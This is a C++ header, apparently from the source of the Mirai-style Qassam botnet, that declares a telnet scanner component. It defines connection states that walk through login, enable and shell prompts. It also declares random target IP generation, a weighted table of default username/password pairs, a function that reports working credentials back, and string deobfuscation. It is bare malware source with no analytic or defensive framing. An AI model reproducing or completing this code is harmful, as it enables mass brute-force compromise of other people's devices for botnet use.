#pragma once

#ifndef QASSAM_QASSAM_SCANNER_HH
#define QASSAM_QASSAM_SCANNER_HH

#include <cstdint>
#include <cstddef>
#include <vector>
#include <memory>
#include <string>

#include "../qassam_engine.hh"
#include "../qassam_support.hh"

#ifdef DEBUG
    inline constexpr int QASSAM_SCANNER_MAX_CONNS = 256;
inline constexpr int QASSAM_SCANNER_RAW_PPS = 384;
#else
inline constexpr int QASSAM_SCANNER_MAX_CONNS = 256;
inline constexpr int QASSAM_SCANNER_RAW_PPS = 384;
#endif

inline constexpr std::size_t QASSAM_SCANNER_RDBUF_SIZE = 256;
inline constexpr int QASSAM_SCANNER_HACK_DRAIN = 64;


enum class QassamScannerState
{
    QassamClosed,
    QassamConnecting,
    QassamHandleIacs,
    QassamWaitingUsername,
    QassamWaitingPassword,
    QassamWaitingPasswdResp,
    QassamWaitingEnableResp,
    QassamWaitingSystemResp,
    QassamWaitingShellResp,
    QassamWaitingShResp,
    QassamWaitingTokenResp
};


class QassamScannerAuth
{
    public:
        std::string username;
        std::string password;
        uint16_t weight_min = 0;
        uint16_t weight_max = 0;
};


class QassamScannerConnection
{
    public:
        std::unique_ptr<QassamScannerAuth> auth;
        int fd = -1;
        int last_recv = 0;
        QassamScannerState state = QassamScannerState::QassamClosed;
        ipv4_t dst_addr = 0;
        uint16_t dst_port = 0;
        int rdbuf_pos = 0;
        std::array<char, QASSAM_SCANNER_RDBUF_SIZE> rdbuf{};
        uint8_t tries = 0;
};


class QassamScanner : public QassamSupport, public QassamScannerConnection, public QassamScannerAuth
{
    public:
        void qassam_setup_connection(QassamScannerConnection& conn);

        [[nodiscard]]
        ipv4_t qassam_get_random_ip() noexcept;

        [[nodiscard]]
        int qassam_consume_iacs(QassamScannerConnection& conn) noexcept;

        [[nodiscard]]
        int qassam_consume_any_prompt(QassamScannerConnection& conn) noexcept;

        [[nodiscard]]
        int qassam_consume_user_prompt(QassamScannerConnection& conn) noexcept;

        [[nodiscard]]
        int qassam_consume_pass_prompt(QassamScannerConnection& conn) noexcept;

        [[nodiscard]]
        int qassam_consume_resp_prompt(QassamScannerConnection& conn) noexcept;

        void qassam_add_auth_entry(const std::string& username, const std::string& password, uint16_t weight) noexcept;

        [[nodiscard]]
        std::unique_ptr<QassamScannerAuth> qassam_random_auth_entry() noexcept;
        void qassam_report_working(ipv4_t addr, uint16_t port, const QassamScannerAuth& auth) noexcept;

        [[nodiscard]]
        std::string qassam_deobf(const std::string& input);

        [[nodiscard]]
        bool qassam_can_consume(const QassamScannerConnection& conn, const uint8_t* buf, int len) noexcept;
};














#endif //QASSAM_QASSAM_SCANNER_HH

